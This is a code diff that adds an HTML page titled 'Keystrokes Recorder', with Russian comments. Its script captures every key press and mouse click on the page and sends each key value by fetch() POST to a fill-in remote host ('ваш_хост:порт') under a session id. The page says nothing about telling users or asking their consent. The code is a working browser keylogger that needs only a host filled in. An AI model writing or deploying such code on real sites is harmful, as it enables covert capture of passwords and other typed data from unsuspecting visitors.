@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keystrokes Recorder</title>
+</head>
+<body>
+    <script>
+        document.addEventListener('keydown', function(event) {
+            // Отправка данных на сервер при каждом нажатии клавиши
+            sendData(event.key);
+        });
+
+        document.addEventListener('click', function(event) {
+            // Отправка данных на сервер при каждом клике мыши
+            sendData('Mouse Click');
+        });
+
+        function sendData(data) {
+            fetch('http://ваш_хост:порт/record', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: 'ваш_уникальный_идентификатор_сессии',
+                    keystrokes: data,
+                }),
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Ошибка:', error));
+        }
+    </script>
+</body>
+</html>
+
